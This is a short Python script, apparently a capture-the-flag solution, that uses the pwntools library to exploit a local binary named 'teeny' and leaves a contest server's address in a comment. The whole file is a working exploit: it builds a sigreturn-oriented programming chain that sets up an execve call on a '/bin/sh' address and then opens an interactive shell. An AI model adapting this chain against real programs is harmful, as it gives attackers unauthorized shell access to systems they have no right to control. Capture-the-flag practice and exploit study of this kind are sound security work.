from pwn import *

context.arch = 'amd64'

# context.terminal = ["tmux", "splitw"]
# p = gdb.debug('/mnt/c/Users/zahar/Downloads/teeny')
# p = remote('cybergon2023.webhop.me', 5004)
p = process('/mnt/c/Users/zahar/Downloads/teeny')

BINSH = 0x40238
POP_RAX = 0x40018
SYSCALL_RET = 0x40015

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = BINSH           
frame.rip = SYSCALL_RET
               
payload = p64(BINSH)
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()